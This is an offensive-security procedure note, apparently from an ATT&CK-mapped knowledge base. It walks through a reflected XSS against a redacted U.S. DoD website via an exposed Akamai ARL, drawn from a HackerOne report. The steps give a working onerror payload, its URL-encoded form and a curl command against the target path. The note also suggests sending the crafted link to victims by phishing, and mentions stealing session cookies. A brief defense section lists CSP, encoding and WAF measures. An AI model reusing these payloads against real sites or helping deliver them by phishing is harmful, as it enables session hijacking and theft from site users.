---
id: proc-uuid-001
tags:
  - xss
  - reflected-xss
  - akamai-arl
type: procedure
tools:
  - '[[tools/goarl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
commands:
  - '[[commands/curl-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.966Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-via-Akamai-ARL-Search

## Summary

This procedure exploits a reflected XSS vulnerability in an open Akamai ARL configuration by injecting a JavaScript payload into the 'where' parameter of a search endpoint on www.citysearch.com, which is processed and reflected unsanitized on a linked DoD website, allowing arbitrary code execution in the victim's browser.

## Description

The attack targets a U.S. Department of Defense website with an exposed Akamai Absolute Request Log (ARL) that logs and reflects search parameters without proper input sanitization or escaping. By crafting a URL that includes a malicious payload in the 'where' parameter, the reflection occurs in the HTML response, enabling JavaScript execution. This can lead to stealing session cookies, keystrokes, or redirecting users to phishing sites. The vulnerability was reported via HackerOne (Report #1317031) and affects public-facing web applications using Akamai CDN without ARL protections.

## Requirements

1. Public access to the vulnerable DoD site (https://█████████/7/0/33/1d/)
2. Browser or tool like curl for testing the payload
3. Knowledge of URL encoding for the payload
4. Optional: [[tools/goarl]] for ARL configuration analysis or PoC generation

## Defense

Defensive measures and detection strategies:

- Enable input sanitization and output encoding in Akamai ARL configurations to escape special characters like quotes and angle brackets
- Implement Content Security Policy (CSP) headers on the DoD site to restrict inline script execution
- Monitor web logs for anomalous search parameters containing script tags or onerror handlers
- Use Web Application Firewall (WAF) rules to block payloads matching XSS patterns in query strings

## Objectives

1. Inject and reflect a malicious JavaScript payload to execute in the browser context
2. Verify execution by alerting the document domain
3. Demonstrate potential for data exfiltration or session hijacking

## Instructions

### Step 1: Craft the Malicious Payload

**Context**: Encode the XSS payload to break out of the 'where' parameter attribute and inject an HTML element that executes JavaScript via an onerror event.

**Command** ([[commands/curl-xss-test]]):
```bash
# No command needed for crafting; manually construct: payload = Binit"><img src=binit onerror=alert(document.domain)>
# URL-encoded: Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E
```

> The payload closes the attribute with ">, injects an <img> tag with a non-existent src (binit) to trigger onerror, and executes alert(document.domain) to confirm execution on the target domain.

### Step 2: Access the Vulnerable Endpoint

**Context**: Append the payload to the search URL embedded in the DoD site's path, triggering the reflection through Akamai ARL.

**Command** ([[commands/curl-xss-test]]):
```bash
curl -v "https://█████████/7/0/33/1d/?search=www.citysearch.com/search?what=Binit&where=Binit%22%3E%3Cimg%20src%3Dbinit%20onerror%3Dalert%28document.domain%29%3E" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

> This curl command simulates a browser request to the DoD URL with the embedded search. Inspect the response HTML for the reflected payload. In a real attack, send the link to a victim via phishing; upon visit, the alert should fire.

### Step 3: Verify Execution

**Context**: Check the response source or observe the alert in a browser to confirm the XSS.

**Command** ([[commands/curl-xss-test]]):
```bash
grep -i "onerror=alert" response.html
```

> Expected output includes the unsanitized payload in the HTML. Success is indicated by the alert popup in browser testing, proving JavaScript execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]

## Tools Used

- [[tools/goarl]]

## Tags

- xss
- akamai-arl
- reflected-xss
